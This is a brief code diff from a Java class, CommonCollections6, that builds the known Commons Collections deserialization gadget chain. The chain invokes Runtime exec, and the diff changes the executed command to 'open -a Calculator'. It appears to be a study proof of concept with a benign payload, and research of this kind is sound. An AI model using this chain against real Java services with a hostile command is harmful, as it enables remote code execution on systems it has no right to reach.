@@ -45,7 +45,7 @@ public class CommonCollections6 {
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                         new Object[]{null, null}),
                 new InvokerTransformer("exec", new Class[]{String.class},
-                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
+                        new Object[]{"open -a Calculator"}),
                 new ConstantTransformer(1), // 隐藏错误信息
         };
         //将 fakeTransformers 数组存入 ChainedTransformer 这个继承类,只在执行时加入执行的数组，防止干扰
